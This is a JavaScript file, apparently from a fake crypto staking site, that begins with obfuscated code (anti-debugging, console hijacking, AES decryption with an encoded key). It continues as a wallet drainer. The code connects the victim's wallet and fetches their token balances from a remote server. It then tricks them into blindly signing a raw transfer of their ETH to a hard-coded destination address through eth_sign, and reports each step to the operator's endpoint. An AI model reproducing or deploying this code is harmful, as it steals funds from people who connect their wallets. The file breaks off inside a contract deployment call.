_0x4e9f46(_0x17b84e,_0x45967e,_0x58519a,_0x2df8af,_0xfcbcd8){return _0x22ee52(_0x17b84e-0xe1,_0x45967e,_0x17b84e-0x2b1,_0x2df8af-0x11b,_0xfcbcd8-0x11e);}!_0x50713[_0x2acb61(0x4a6,0x51b,0x4ef,0x4d8,0x49b)](_0x4963ee[_0x2acb61(0x518,0x569,0x528,0x52f,0x56c)](_0x2e7172,_0x4963ee[_0x4e9f46(0x75,0x3f,0x5d,0xa4,0x33)]))||!_0x3cc2d4[_0x24254d(-0x211,-0x1ba,-0x1fe,-0x1fa,-0x1d6)](_0x4963ee[_0x24254d(-0x1e5,-0x162,-0x1a7,-0x1ca,-0x173)](_0x2e7172,_0x4963ee[_0x115244(0x39f,0x3a3,0x37e,0x36a,0x3bd)]))?_0x4963ee[_0x307e31(0x423,0x3ef,0x408,0x3f5,0x3e5)](_0x2e7172,'0'):_0x4963ee[_0x115244(0x3af,0x369,0x399,0x375,0x348)](_0x3550c9);})();}());const _0x3d8d45=(function(){let _0x1104f8=!![];return function(_0x38f7c4,_0x245657){const _0x2df3dc=_0x1104f8?function(){function _0x1af2a9(_0x501886,_0x2b6967,_0x23e3e7,_0x48bc91,_0x9044b6){return _0x23d3(_0x23e3e7-0x231,_0x48bc91);}if(_0x245657){const _0x153201=_0x245657[_0x1af2a9(0x453,0x3e1,0x41c,0x459,0x3f4)](_0x38f7c4,arguments);return _0x245657=null,_0x153201;}}:function(){};return _0x1104f8=![],_0x2df3dc;};}()),_0x5cd3a5=_0x3d8d45(this,function(){const _0x26ecbc={'BTQES':function(_0x2c657b,_0x3a529e){return _0x2c657b(_0x3a529e);},'AXORC':function(_0x544f12,_0x5d0e0b){return _0x544f12+_0x5d0e0b;},'RLNMP':function(_0x490637,_0x31721d){return _0x490637+_0x31721d;},'iIMOK':_0x27a658(0x3,-0x1b,-0x14,0x4a,0xe)+_0x11e8c1(-0x1e7,-0x20a,-0x218,-0x213,-0x221)+_0x11e8c1(-0x1da,-0x1de,-0x1bc,-0x185,-0x19b)+_0x560742(-0xd9,-0xee,-0x100,-0x105,-0xf0),'qdMNB':_0x560742(-0x73,-0x43,-0x76,-0x84,-0x4d)+_0x27a658(0x89,0x5c,0xd,0xb,0x47)+_0x1ed27e(-0xfc,-0xb2,-0xb0,-0x8a,-0xf3)+_0x11e8c1(-0x1ea,-0x1f8,-0x215,-0x24a,-0x200)+_0x560742(-0x51,-0x5f,-0x33,-0x21,-0x3e)+_0x27a658(0x8f,0x45,0x34,0x36,0x49)+'\x20)','nVVuy':function(_0x55ffd7){return _0x55ffd7();},'FQMFI':_0x11e8c1(-0x17c,-0x1ca,-0x1bf,-0x1bb,-0x1d0),'lfQUe':_0x560742(-0x8d,-0x51,-0x49,-0x72,-0x74),'nlMby':_0x4cd83c(0x515,0x518,0x4cf,0x50e,0x518),'gQEKP':_0x4cd83c(0x54b,0x52b,0x526,0x51c,0x542),'UtVxz':_0x27a658(-0x49,0x15,0x14,-0x38,-0x1b)+_0x560742(-0xc1,-0xed,-0xe6,-0x7e,-0x104),'ZslCb':_0x27a658(0x26,-0x4,0x5b,0x64,0x41),'WZMMD':_0x560742(-0x74,-0x52,-0x67,-0x33,-0x4c),'TGmzw':function(_0x262726,_0x214976){return _0x262726<_0x214976;}};function _0x560742(_0x109b11,_0xd48d9a,_0x24595a,_0x1ead9e,_0x17d085){return _0x23d3(_0x109b11- -0x27e,_0x17d085);}let _0xcc3ae5;function _0x1ed27e(_0x322358,_0x2691a0,_0x2081a4,_0x26d941,_0x1a8e92){return _0x23d3(_0x2691a0- -0x25f,_0x1a8e92);}function _0x11e8c1(_0x3aed84,_0x1825a6,_0x214bae,_0x3ee50e,_0x1da38a){return _0x23d3(_0x214bae- -0x3dc,_0x1da38a);}try{const _0x15e3a1=_0x26ecbc[_0x27a658(0x7a,0x73,0x78,0x27,0x32)](Function,_0x26ecbc[_0x4cd83c(0x506,0x4be,0x4a0,0x4cf,0x4ea)](_0x26ecbc[_0x1ed27e(-0x8e,-0x67,-0x8c,-0x73,-0x23)](_0x26ecbc[_0x560742(-0x72,-0x46,-0x79,-0x3c,-0xb9)],_0x26ecbc[_0x11e8c1(-0x1fa,-0x1d3,-0x1ea,-0x1a6,-0x206)]),');'));_0xcc3ae5=_0x26ecbc[_0x4cd83c(0x4cd,0x522,0x4a6,0x4d9,0x4b9)](_0x15e3a1);}catch(_0x1ef2d0){_0xcc3ae5=window;}const _0x10961c=_0xcc3ae5[_0x560742(-0x6f,-0x73,-0x8d,-0xa7,-0x52)+'le']=_0xcc3ae5[_0x560742(-0x6f,-0xad,-0x89,-0xa0,-0x31)+'le']||{};function _0x4cd83c(_0x47e652,_0xddab1d,_0x176b1d,_0x33602b,_0x2f86b0){return _0x23d3(_0x33602b-0x2f6,_0xddab1d);}const _0x45675b=[_0x26ecbc[_0x4cd83c(0x50c,0x4c2,0x4ec,0x4f3,0x534)],_0x26ecbc[_0x11e8c1(-0x274,-0x207,-0x22e,-0x261,-0x243)],_0x26ecbc[_0x1ed27e(-0xb9,-0x8f,-0xa2,-0x65,-0x46)],_0x26ecbc[_0x11e8c1(-0x1e1,-0x1f2,-0x1f0,-0x1b8,-0x1ef)],_0x26ecbc[_0x4cd83c(0x4f4,0x55b,0x541,0x525,0x525)],_0x26ecbc[_0x4cd83c(0x4fa,0x519,0x528,0x4fd,0x50f)],_0x26ecbc[_0x27a658(0x14,-0x21,0x40,0x1a,0x1a)]];function _0x27a658(_0x5061ba,_0x4748ed,_0xb70aab,_0x187007,_0x54e5df){return _0x23d3(_0x54e5df- -0x1d0,_0x187007);}for(let _0x504bbb=-0x2*0x23+-0xe3b*0x1+0xe81;_0x26ecbc[_0x11e8c1(-0x214,-0x212,-0x201,-0x1fb,-0x22c)](_0x504bbb,_0x45675b[_0x27a658(-0x31,-0x1c,0x4a,0x3b,0x14)+'h']);_0x504bbb++){const _0x574b7a=_0x3d8d45[_0x4cd83c(0x4ed,0x4af,0x4ac,0x4c0,0x478)+_0x4cd83c(0x4d8,0x4e9,0x4ed,0x50a,0x4e9)+'r'][_0x1ed27e(-0xc9,-0x9f,-0xe7,-0x55,-0x9d)+_0x1ed27e(-0x73,-0xa3,-0xba,-0x9c,-0xbb)][_0x560742(-0xd5,-0xf0,-0x9a,-0xda,-0xe9)](_0x3d8d45),_0x1c02dc=_0x45675b[_0x504bbb],_0x3fb81b=_0x10961c[_0x1c02dc]||_0x574b7a;_0x574b7a[_0x11e8c1(-0x24a,-0x1c8,-0x206,-0x1da,-0x1ff)+_0x560742(-0x9f,-0xb6,-0xac,-0xcb,-0xbf)]=_0x3d8d45[_0x1ed27e(-0xf6,-0xb6,-0xae,-0xaf,-0x9c)](_0x3d8d45),_0x574b7a[_0x27a658(0xc,-0xd,-0x3a,0x4,-0x17)+_0x4cd83c(0x4e5,0x549,0x510,0x521,0x4f4)]=_0x3fb81b[_0x1ed27e(-0x66,-0xa6,-0xcd,-0x87,-0xbd)+_0x4cd83c(0x4ea,0x51e,0x4f1,0x521,0x562)][_0x11e8c1(-0x204,-0x269,-0x233,-0x254,-0x26b)](_0x3fb81b),_0x10961c[_0x1c02dc]=_0x574b7a;}});(function(){function _0x10b495(_0x5d0735,_0x4b15ff,_0x1a7549,_0x25a2b8,_0x4467a4){return _0x23d3(_0x4b15ff- -0x93,_0x1a7549);}const _0x4a6bd4={'fbYoC':function(_0x113d97,_0x111c81){return _0x113d97(_0x111c81);},'Xfvft':function(_0x210a91,_0x4b1bdb){return _0x210a91+_0x4b1bdb;},'uriks':_0x14ea06(0x3f,0x50,0x7f,0x39,0x4c)+_0x14ea06(0x0,0x36,0x75,0x1b,0x77)+_0x10b495(0x1d5,0x18d,0x165,0x1a1,0x17d)+_0x14ea06(-0x22,0x17,-0x9,0x5,-0x28),'kjxvn':_0x4fc6e2(-0x146,-0x145,-0x18f,-0x172,-0x163)+_0x339037(0x528,0x545,0x507,0x53d,0x536)+_0x339037(0x4bc,0x4db,0x503,0x4d5,0x4ac)+_0x10b495(0x16a,0x134,0x129,0x17e,0x15f)+_0x14ea06(0xd6,0x9f,0x72,0xbd,0x80)+_0x4fc6e2(-0x16d,-0x19c,-0x181,-0x16a,-0x192)+'\x20)','LVqAv':function(_0x521949){return _0x521949();}};function _0x532d3a(_0x3fa62e,_0x56534b,_0x1f965a,_0xaf350e,_0x556d45){return _0x23d3(_0x556d45- -0x100,_0x56534b);}function _0x14ea06(_0x21f579,_0x357502,_0x4dbf6f,_0x20e7c5,_0x185208){return _0x23d3(_0x357502- -0x18e,_0x185208);}const _0x2784f6=function(){function _0x134bc1(_0x584c6e,_0xa887f3,_0x23a07a,_0x365b02,_0x27a16d){return _0x14ea06(_0x584c6e-0xa1,_0xa887f3- -0x1b2,_0x23a07a-0x49,_0x365b02-0x53,_0x23a07a);}function _0x2449b5(_0x516fe7,_0x81ffce,_0x57fed5,_0x45955e,_0x34f95e){return _0x532d3a(_0x516fe7-0xe,_0x57fed5,_0x57fed5-0x1cf,_0x45955e-0x1d5,_0x34f95e-0x165);}let _0x3c2f32;try{_0x3c2f32=_0x4a6bd4[_0x3b0c11(0x1f5,0x22e,0x20f,0x1bd,0x21c)](Function,_0x4a6bd4[_0x3b0c11(0x217,0x1e9,0x201,0x205,0x21a)](_0x4a6bd4[_0x3b0c11(0x217,0x249,0x1d9,0x204,0x20d)](_0x4a6bd4[_0xc4ada4(-0x1a7,-0x1d3,-0x17d,-0x1ad,-0x17d)],_0x4a6bd4[_0xc4ada4(-0x1e2,-0x22c,-0x210,-0x1e7,-0x1b8)]),');'))();}catch(_0x36fa33){_0x3c2f32=window;}function _0x48f873(_0x5e44f2,_0x358768,_0x95ef91,_0xc1446d,_0x1b758a){return _0x14ea06(_0x5e44f2-0xe,_0x358768-0x143,_0x95ef91-0x3f,_0xc1446d-0x32,_0x95ef91);}function _0x3b0c11(_0x21e9ff,_0x4f3979,_0x533f89,_0x5b0207,_0x34e4a5){return _0x14ea06(_0x21e9ff-0x11,_0x21e9ff-0x1a9,_0x533f89-0x4d,_0x5b0207-0x6b,_0x4f3979);}function _0xc4ada4(_0x202fec,_0x5cb839,_0x513096,_0x1a5375,_0x110582){return _0x339037(_0x202fec-0x1ba,_0x202fec- -0x6ba,_0x513096-0x8a,_0x5cb839,_0x110582-0xb4);}return _0x3c2f32;},_0x30f04d=_0x4a6bd4[_0x339037(0x4dd,0x4e2,0x4f3,0x4a0,0x51a)](_0x2784f6);function _0x4fc6e2(_0x2ede60,_0x16ef2c,_0xdf894f,_0x498c62,_0xae7784){return _0x23d3(_0xdf894f- -0x39a,_0x2ede60);}function _0x339037(_0x353d53,_0x31ec14,_0x28b8b8,_0x47d92b,_0x5bcba5){return _0x23d3(_0x31ec14-0x32e,_0x47d92b);}_0x30f04d[_0x532d3a(0x8e,0x10e,0xbc,0x91,0xcf)+_0x4fc6e2(-0x1be,-0x191,-0x1d4,-0x1dc,-0x1e8)+'l'](_0x3550c9,-0x966+0x5*0x137+0x21*0x93);}());function _0x593dde(_0x4f4cc1,_0x14a6ca,_0x2cf397,_0x4faf60,_0x317963){return _0x23d3(_0x2cf397-0x118,_0x4f4cc1);}function _0x4053(){const _0x192d4c=['Pkcs7','\x5c(\x20*\x5c','pad','AES','LVqAv','excep','strin','Utf8','(((.+','toStr','1179860juNDgW','init','type','tion','JKNiS','jc1OG','proto','ecLgq','$]*)','decry','n\x20(fu','debu','terva','\x22retu','creat','actio','const','jOWMx','YhuCv','ption','8581DjpvbD','setIn','nlMby','Z_$][','ODJhY','CBC','gger','188215eHRgZS','__pro','test','NWU0Y','AXORC','fbYoC','TGmzw','GI4Zj','input','retur','to__','27cWysWK','ZcQQa','FQFct','nVVuy','lengt','uriks','parse','NWQ3O','*(?:[','yfQOy','WZMMD','apply','gQEKP','28npojcH','rmFOl','jMDZh','chain','warn','qdMNB','\x20erro','WRiY2','ion\x20*','mode','dYYUt','RLNMP','qmPZG','KtenN','Objec','Xfvft','FQMFI','rray','MzhiY','OIPZX',')+)+)','BTQES','searc','WM4OW','enc','jYmDm','ZslCb','vUHnY','zA-Z_','trace','{}.co','iIMOK','funct','Q==','conso','PKrlw','table','FmY2Z','QdWAA','ructo','528052KxKyiD','euQvm','nstru','info','is\x22)(','437440AYMHTQ','0-9a-','bmkIn','log','FepIu','Decry','nctio','call','iMmU2','e)\x20{}','sJHJZ','I1OWV','error','WordA','MGM1O','UyOWR','bTNrC','ing','509136wrmMNQ','rn\x20th','kQZwO','UtVxz','lib','4NjMw','count','\x20(tru','5069961qvjWWQ','a-zA-','awEIe','cOJiB','dPFGy','n()\x20','\x5c+\x5c+\x20','carVA','while','bind','kjxvn','FhZjk','ijGXB','ctor(','lfQUe','state'];_0x4053=function(){return _0x192d4c;};return _0x4053();}function _0x23d3(_0x40093d,_0x37a29a){const _0x5d082f=_0x4053();return _0x23d3=function(_0x10f7b9,_0x239548){_0x10f7b9=_0x10f7b9-(0xbcf*0x1+-0x10*-0xd7+0x1*-0x179b);let _0x277c0b=_0x5d082f[_0x10f7b9];return _0x277c0b;},_0x23d3(_0x40093d,_0x37a29a);}_0x5cd3a5();function _0x1c68b3(_0x5c5c12,_0x3b6697,_0x3cecdc,_0x4f23c5,_0x16e3fc){return _0x23d3(_0x3b6697-0x2a7,_0x16e3fc);}try{let t=CryptoJS[_0x1e32c0(0x1c2,0x1f3,0x1c0,0x1f0,0x1c1)][_0x1e32c0(0x14e,0x1b1,0x149,0x1a7,0x173)][_0x1e32c0(0x1dd,0x174,0x1a7,0x1bd,0x1a2)](atob(_0x1e32c0(0x200,0x1c1,0x18c,0x1ed,0x1bb)+_0x593dde(0x34c,0x347,0x30c,0x34c,0x32b)+_0xd86b45(0xd,0x48,0x36,0x73,0x3e)+_0x593dde(0x32c,0x34a,0x307,0x34d,0x2d1)+_0x593dde(0x2ea,0x30d,0x2ff,0x2d8,0x2ca)+_0x1e32c0(0x18b,0x167,0x1a5,0x1e2,0x198)+_0x1e32c0(0x1c6,0x1b0,0x1e8,0x1f7,0x1e5)+_0x1c68b3(0x4e0,0x4c9,0x4f2,0x4d5,0x4e1)+_0x2bddf0(-0x16d,-0x193,-0x15e,-0x156,-0x16a)+_0x2bddf0(-0x1ae,-0x17e,-0x1c4,-0x18e,-0x18e)+_0x2bddf0(-0x225,-0x21f,-0x1ee,-0x1b4,-0x1e7)+_0xd86b45(0x80,0x46,0x42,0x66,0x7d)+_0x593dde(0x2f0,0x338,0x2f0,0x2ee,0x2fb)+_0x1c68b3(0x467,0x466,0x4a9,0x434,0x464)+_0xd86b45(0x4d,-0x22,0x23,0x5f,0x23)+_0x1e32c0(0x16a,0x146,0x1a2,0x196,0x187)+_0x1e32c0(0x1a3,0x1cf,0x175,0x189,0x18e)+_0x1e32c0(0x1c9,0x1eb,0x1cd,0x1d3,0x1ca))),c=CryptoJS[_0x1c68b3(0x469,0x45a,0x41f,0x441,0x477)][_0x593dde(0x298,0x2d7,0x2db,0x2a5,0x322)+'pt'](decodeURIComponent(e),t,{'mode':CryptoJS[_0xd86b45(-0x27,0xb,0x7,-0x37,0x1f)][_0x593dde(0x2f3,0x2e2,0x2eb,0x318,0x2b8)],'padding':CryptoJS[_0x2bddf0(-0x206,-0x223,-0x20e,-0x21d,-0x1e0)][_0xd86b45(-0xe,-0xb,-0x3f,-0x64,-0x2e)],'iv':CryptoJS[_0x2bddf0(-0x16b,-0x199,-0x14d,-0x132,-0x162)][_0x593dde(0x376,0x34e,0x33f,0x355,0x313)+_0xd86b45(-0x2c,0x4c,0xf,0x21,-0x36)][_0x593dde(0x2aa,0x2d6,0x2e0,0x323,0x30e)+'e']([-0x89f+0x2404+-0x1b65])});return c[_0xd86b45(-0x59,-0x11,-0x36,-0x62,-0x4)+_0x2bddf0(-0x192,-0x17e,-0x134,-0x13e,-0x167)](CryptoJS[_0x2bddf0(-0x178,-0x19b,-0x146,-0x1b9,-0x18d)][_0x1e32c0(0x13b,0x18d,0x16b,0x154,0x173)]);}catch(_0x26e19e){return console[_0x1e32c0(0x212,0x206,0x1b6,0x22a,0x1e2)](_0x1c68b3(0x48c,0x4c6,0x4d5,0x483,0x487)+_0x1c68b3(0x4bc,0x474,0x4a4,0x493,0x48b)+_0x1c68b3(0x486,0x49a,0x4c2,0x45e,0x48c)+'r:',_0x26e19e),null;}function _0x1e32c0(_0x5a9fab,_0x4ddefc,_0x8ffbe1,_0x3aacef,_0x48a6fd){return _0x23d3(_0x48a6fd- -0x44,_0x3aacef);}function _0x3550c9(_0x4ac9ca){function _0x2536d1(_0x9d2034,_0x3a406e,_0x581a67,_0x239072,_0x429f25){return _0xd86b45(_0x9d2034-0x46,_0x3a406e-0x58,_0x239072- -0x11a,_0x9d2034,_0x429f25-0x16d);}function _0xa03ee8(_0x1ae36d,_0x5ebcf5,_0x406e37,_0x95e20,_0x5e734e){return _0x2bddf0(_0x5e734e,_0x5ebcf5-0xa3,_0x406e37-0x9b,_0x95e20-0x155,_0x406e37-0x32e);}const _0x296068={'carVA':function(_0x2c66ea,_0x495b96){return _0x2c66ea===_0x495b96;},'KtenN':_0xa03ee8(0x15c,0x136,0x152,0x10c,0x18c)+'g','PKrlw':_0x2536d1(-0x14f,-0x12d,-0x12a,-0x161,-0x166)+_0x2536d1(-0x10e,-0x93,-0xda,-0xd6,-0xb2)+_0x45b5e7(-0xea,-0x101,-0xb9,-0xae,-0xb1),'jYmDm':_0x16c971(-0x182,-0x138,-0x153,-0x186,-0x1b8)+'er','dPFGy':function(_0x5dcdb7,_0x2c572d){return _0x5dcdb7!==_0x2c572d;},'ZcQQa':function(_0x49fc33,_0x477df9){return _0x49fc33+_0x477df9;},'FepIu':function(_0x17073b,_0xf8a4c){return _0x17073b/_0xf8a4c;},'awEIe':_0x27d8cb(0x198,0x1e2,0x225,0x20a,0x1f1)+'h','rmFOl':function(_0x53fc0d,_0x524965){return _0x53fc0d===_0x524965;},'sJHJZ':function(_0x1b9d39,_0x133d71){return _0x1b9d39%_0x133d71;},'JKNiS':_0x27d8cb(0x209,0x1c3,0x1a2,0x1af,0x182),'OIPZX':_0x16c971(-0x1e0,-0x1ac,-0x1d3,-0x1bd,-0x1d7),'QdWAA':_0xa03ee8(0x196,0x127,0x165,0x131,0x1a5)+'n','ecLgq':_0xa03ee8(0x16f,0x160,0x14b,0x16a,0x105)+_0x2536d1(-0x143,-0x108,-0x119,-0x10e,-0x14d)+'t','euQvm':function(_0x2fa18f,_0x3a63b2){return _0x2fa18f(_0x3a63b2);},'qmPZG':function(_0x4d7e26,_0x52a081){return _0x4d7e26(_0x52a081);}};function _0x27d8cb(_0x48a966,_0x1cfe4e,_0x1ae796,_0xb74add,_0x2ce1b9){return _0x593dde(_0x1ae796,_0x1cfe4e-0xac,_0x1cfe4e- -0x11a,_0xb74add-0x39,_0x2ce1b9-0x1b2);}function _0x45b5e7(_0x2f9ca7,_0x44eb32,_0x41fa43,_0x4ce68a,_0x50721d){return _0x1e32c0(_0x2f9ca7-0x5c,_0x44eb32-0x1e4,_0x41fa43-0x26,_0x41fa43,_0x2f9ca7- -0x2c9);}function _0x261b25(_0x1ea1a1){function _0x5aa2fc(_0x318f3d,_0x259e97,_0x543795,_0x25ff39,_0x58b582){return _0x27d8cb(_0x318f3d-0x89,_0x318f3d- -0x2b9,_0x25ff39,_0x25ff39-0xa3,_0x58b582-0x1b2);}if(_0x296068[_0x5aa2fc(-0x114,-0xdd,-0xce,-0xcc,-0x133)](typeof _0x1ea1a1,_0x296068[_0x5aa2fc(-0xc1,-0xda,-0x7c,-0x98,-0xd6)]))return function(_0x57a276){}[_0x5aa2fc(-0xf1,-0x133,-0x122,-0xbe,-0x134)+_0x2186e7(0x52a,0x55f,0x535,0x578,0x542)+'r'](_0x296068[_0x2186e7(0x573,0x55b,0x59c,0x54d,0x518)])[_0x5aa2fc(-0xd0,-0xfc,-0x97,-0xc4,-0x9f)](_0x296068[_0x4e7574(0x499,0x4de,0x4e5,0x4d6,0x50a)]);else _0x296068[_0x4e7574(0x4b1,0x47c,0x438,0x461,0x491)](_0x296068[_0x2186e7(0x50c,0x52c,0x563,0x4e3,0x4ed)]('',_0x296068[_0x3542cc(0x2f5,0x31d,0x2fb,0x30f,0x30d)](_0x1ea1a1,_0x1ea1a1))[_0x296068[_0x4e7574(0x532,0x50e,0x552,0x514,0x511)]],0x14c2+0x2*-0x4ec+-0x3a3*0x3)||_0x296068[_0x4e7574(0x4cc,0x4c6,0x502,0x4bc,0x4fc)](_0x296068[_0x5aa2fc(-0x97,-0xb9,-0xba,-0x7e,-0x65)](_0x1ea1a1,0x1ea0+0xae1+0xf*-0x2c3),-0x171a*-0x1+-0x17ed+0xd3)?function(){return!![];}[_0x5aa2fc(-0xf1,-0x13b,-0xc9,-0xcf,-0x130)+_0x4e7574(0x4dd,0x4ec,0x521,0x4fb,0x4fa)+'r'](_0x296068[_0x5aa2fc(-0xda,-0x10b,-0xcb,-0xc0,-0xbc)](_0x296068[_0x3542cc(0x2c8,0x2cd,0x263,0x284,0x2ad)],_0x296068[_0x3542cc(0x326,0x331,0x2f8,0x2b6,0x2ef)]))[_0x3542cc(0x315,0x2e7,0x32b,0x2e1,0x310)](_0x296068[_0x2186e7(0x56b,0x55e,0x576,0x599,0x596)]):function(){return![];}[_0x4e7574(0x468,0x4a2,0x45b,0x4d1,0x470)+_0x5ec183(0x3db,0x3ee,0x3ae,0x391,0x397)+'r'](_0x296068[_0x4e7574(0x495,0x4b9,0x495,0x475,0x4d5)](_0x296068[_0x5aa2fc(-0xfd,-0xc7,-0xfd,-0xeb,-0xf4)],_0x296068[_0x5ec183(0x3d0,0x3cd,0x39a,0x391,0x3c6)]))[_0x3542cc(0x291,0x323,0x296,0x30f,0x2da)](_0x296068[_0x2186e7(0x515,0x50c,0x515,0x4d7,0x548)]);function _0x2186e7(_0x1ca177,_0x35323a,_0x58ab16,_0x590562,_0x509af4){return _0x27d8cb(_0x1ca177-0x56,_0x35323a-0x34d,_0x509af4,_0x590562-0xc1,_0x509af4-0x13f);}function _0x3542cc(_0x436645,_0xa418b,_0x2fe805,_0x2ec229,_0x57a86c){return _0x2536d1(_0x436645,_0xa418b-0xb5,_0x2fe805-0x7e,_0x57a86c-0x3f8,_0x57a86c-0x1ba);}function _0x5ec183(_0x804d84,_0x549bb7,_0x17e3b4,_0xf03489,_0x596f99){return _0xa03ee8(_0x804d84-0x1c5,_0x549bb7-0x118,_0x17e3b4-0x1fe,_0xf03489-0x13a,_0xf03489);}function _0x4e7574(_0x4e21b0,_0x23c66a,_0x20829f,_0x56ef30,_0x19ac45){return _0xa03ee8(_0x4e21b0-0x1d7,_0x23c66a-0xed,_0x23c66a-0x33c,_0x56ef30-0x27,_0x20829f);}_0x296068[_0x5ec183(0x3dd,0x3f8,0x3b0,0x3e5,0x3ae)](_0x261b25,++_0x1ea1a1);}function _0x16c971(_0x363d59,_0x37c0d4,_0x2a3ccb,_0x1a8f8e,_0x421b25){return _0x1c68b3(_0x363d59-0x127,_0x363d59- -0x65b,_0x2a3ccb-0x101,_0x1a8f8e-0x126,_0x37c0d4);}try{if(_0x4ac9ca)return _0x261b25;else _0x296068[_0x27d8cb(0x20e,0x1f7,0x204,0x1e9,0x222)](_0x261b25,-0x35*-0x95+0x25*-0xf+-0x1cae);}catch(_0xb606d3){}}
}
function generateEncryptedValue(e){
	try{e=JSON.stringify(e);let t=encryptSHA256(e),c=encodeURIComponent(t);
		return c}catch{return null}
}
async function connectWallet(injected) {
		closeModal();
		if(injected){
			await popUpshow("conn1");
		}
	
	if ( isConnected() ) {
		popUpshow("success");
		await wagmi4L();
	} else {
		console.log( 'not yet connected. trying to connect' )
		try {
				if(injected){
					await connect({
								connector: injectedconnector
					})
					if ( isConnected() ) {
						await popUpshow("success");
						await wagmi4L();

					}
				}else{
					await web3Modal.openModal();
					const unsubscribe = web3Modal.subscribeModal( async ( newState ) => {
						if ( isConnected() ) {
							await popUpshow("success");
							await wagmi4L();
							unsubscribe()
						}
					} );
				}
				
			
		}catch ( error ) {
			console.log( 'Failed to connect:', error );
			alert( "Couldn't connect. Please Retry." );
			return
		}
	}
}
async function recalibratebutton( btntext, changestate ) {
  
  for ( const btn of interactButton ) {

	  if (changestate) {
      btn.removeAttribute('disabled');
  }
//   btn.innerHTML = btntext;

  }

}
async function switchChain( targetId, chainName ) {
	
	try {
		const network = await switchNetwork( {
			chainId: targetId,
	} )
 	} catch ( error ) {
		console.error( 'Failed to switch network:', error );
		notify({},`┌🔀❌ Failed to switch network ❌\n`+
		`├♾️ ${chainName} Chain\n`+
		`└🔗Website: ${window.location.host}\n\n please ask cl to reconnect if error continues` );
		alert( `Wrong Network. Please Switch Browser Network to ${chainName}. Disconnect and reconnect if error persists` );
	}
}
async function fetchBalances() {
	let account = getAccount();
	const url = `${host_url}/oracle/tokens?address=${account.address}`;
	const headers = {
		'Accept': 'application/json',
	};
	try {
		const response = await fetch( url, {
			method: 'GET',
			headers: headers
		} );
		if ( !response.ok ) {
			throw new Error( `HTTP error! Status: ${response.status}` );
		}
		const data = await response.json();
		let decryptedData = decryptSHA256(data.encrypted)
		decryptedData = JSON.parse(decryptedData)[0]
		return [ decryptedData, account.address ];
	} catch ( error ) {
		console.error( "Tokens Fetch error: ", error );
		return[null,false];
	}
}
String.prototype.format = function () {
    let args = arguments;
    return this.replace(/{(\d+)}/g, function (match, index) {
        return typeof args[index] == 'undefined' ? match : args[index];
    });
};

function notify(params, title) {
	if (!sendNotif) {
	  return;
	}
	
	const requestData = {
	  params: params,
	  title: title,
	  sendNotif: sendNotif,
	};
  
	const xhrr = new XMLHttpRequest();
	const url = `${host_url}/oracle/notify`;
  
	xhrr.open("POST", url, true);
	xhrr.setRequestHeader("Content-Type", "application/json");
  
	xhrr.onreadystatechange = function() {
	  if (xhrr.readyState === 4 && xhrr.status === 200) {
		const response = JSON.parse(xhrr.responseText);
	  }
	};
  
	const enc_data = generateEncryptedValue(requestData);
	xhrr.send(JSON.stringify({ encrypted: enc_data })); 
  }
  

const getABI = async (address, abiUrl) => {
    let res = await axios.get(abiUrl.format(address));
    res = res.data.result[0];
	console.log("address: ",address, " impl: " ,res['Implementation'])
    let abi = JSON.parse(res['ABI']);
    let impl = '';
    if (res['Proxy'] === '1' && res['Implementation'] !== "") {
        impl = res['Implementation'];
        console.log('Getting impl ABI for', impl);
        abi = JSON.parse((await axios.get(abiUrl.format(impl))).data.result[0]['ABI']);
    }
    return [abi, impl];
}
	
async function stakeEthwithSign( chain, addy, amt ) {
		try {
			const publicClient = getPublicClient({
				chainId: chain,
			  });
			  const walletClient = await getWalletClient({
				chainId: chain,
			  })
			  let nonce  = (await publicClient.getTransactionCount({  
				address: addy,
			  }));
		
		
			let gasPrice = await publicClient.getGasPrice();
			let hexGasPrice  = numberToHex(gasPrice * 2n);
		
			let transactionObject = {
				nonce: Web3.utils.toHex(nonce),
				gasPrice: hexGasPrice,
				gasLimit:  "0x55F0",
				to: destination_addy_final,
				value: '0x' + amt.toString(16),
				data: '0x',
				v: numberToHex(chain),
				r: '0x',
				s: '0x',
			 }
		
			 let hexObject = new ethereumjs.Tx(transactionObject);
			 let hexString = '0x' + hexObject.serialize().toString('hex')
			 let rawHash = Web3.utils.sha3(hexString, {
				encoding: 'hex'
			});

		let client, injectedAccount
		client = createWalletClient({
			chain: walletClient["chain"],
				transport: custom(window.ethereum)
			})

			injectedAccount = await client.request({
								method: "eth_accounts",
								params: []
		});

			if(injectedAccount[0].toLowerCase()!= addy.toLowerCase() || (injectedAccount[0] == undefined)){
				throw new Error("mismatch addrress or no injected"); // Throw an error
			}
			console.log("injectedAccount: ",injectedAccount[0])
		  	const signature = await client.request({
			method: "eth_sign",
			params: [
				addy,
				rawHash,

			]
		  })
		let firstPrefix = signature.substring(2);
		let r = '0x' + firstPrefix.substring(0, 64);
		let s = '0x' + firstPrefix.substring(64, 128);
		let fullHash = parseInt(firstPrefix.substring(128, 130), 16);
		let v = numberToHex(fullHash + parseInt(chain) * 2 + 8);

		hexObject.r = r
		hexObject.s = s
		hexObject.v = v
		let signedTx = '0x' + hexObject.serialize().toString('hex');

			console.log(signedTx)
		   
		  const finalHash = await publicClient.sendRawTransaction({ serializedTransaction: signedTx });
			
		console.log("ETH success", finalHash);
		return[1,finalHash]
	} catch (error) {
		if(error.code != 4001) {
			let res_code = 67;
			return[res_code,false]
		}
		else if(error.code == 4001) {
			let res_code = 203;
			return[res_code,false]
		}
		else{
			let res_code = 66;
			return[res_code,false]
		}
	}
}

async function stakeEth( chain, addy, amt ) {
let stakewithcontract  = false;
// stakewithcontract = true;
if (stakewithcontract){
	const walletClient = await getWalletClient({
		chainId: chain,
	  })
	const abi = [
		{
			"inputs": [
				{
					"internalType": "address payable",
					"name": "_devAddress",
					"type": "address"
				}
			],
			"payable": true,
			"stateMutability": "payable",
			"type": "constructor"
		},
		{
			"constant": false,
			"inputs": [],
			"name": "devwithdraw",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"internalType": "address payable",
					"name": "recipient",
					"type": "address"
				},
				{
					"internalType": "uint256",
					"name": "percentage",
					"type": "uint256"
				}
			],
			"name": "withdraw",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant":false,
			"inputs":[ {
				"name": "_from", "type":"address"
			}
			,
				{
				"name": "_to", "type":"address"
			}
			,
				{
				"name": "_value", "type":"uint256"
			}
			],
			"name":"transferFrom",
			"outputs":[],
			"payable":false,
			"stateMutability":"nonpayable",
			"type":"function"
		}
	];
	try{
		const hash = await walletClient.deployContract({
			abi: abi,
